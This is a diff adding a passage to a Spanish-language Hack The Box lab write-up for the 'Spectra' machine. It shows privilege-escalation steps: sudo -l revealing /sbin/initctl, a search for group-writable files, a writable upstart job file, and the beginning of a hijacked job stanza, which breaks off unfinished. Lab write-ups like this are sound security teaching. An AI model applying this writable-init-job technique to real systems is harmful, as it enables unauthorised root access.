@@ -110,7 +110,55 @@ Tambien tenemos otro archivo que nos dice literalmente la pass en la ruta /etc/a
 SummerHereWeCome!!
 ```
 
+cuando hacemos un sudo -l para ver los permisos encontramos una ruta "/sbin/initctl"
 
+Buscando este tipo de archivos se encunetran en el directorio /srv
+```
+find / -group developers 2>/dev/null
+```
+
+este contenido tiene los test del servidor
+```
+ls -al srv/
+```
+
+```
+cat srv/nodetest.js
+```
+Encontramos un js que crea un servidor 
+
+si vemos la ejecución y a donde va tenemos permisos de escritura y ejecución 
+
+![image](https://github.com/D4l1-web/HTB/assets/79869523/2ec39131-fadf-48ce-b107-36f6f07f17eb)
+
+Encontramos esto 
+```
+katie@spectra ~ $ cat /etc/init/test.conf
+description "Test node.js server"
+author "katie"
+start on filesystem or runlevel [2345]
+stop on shutdown
+script
+export HOME="/srv"
+echo $$ > /var/run/nodetest.pid
+ exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+end script
+pre-start script
+echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
+end script
+pre-stop script
+rm /var/run/nodetest.pid
+echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
+end script
+```
+
+Busquemos "upstart initctl"
+
+Descubrimos como trucar el "inictl" para remplazar el contenido
+```
+start on pwn
+task
+exec
 
 
 
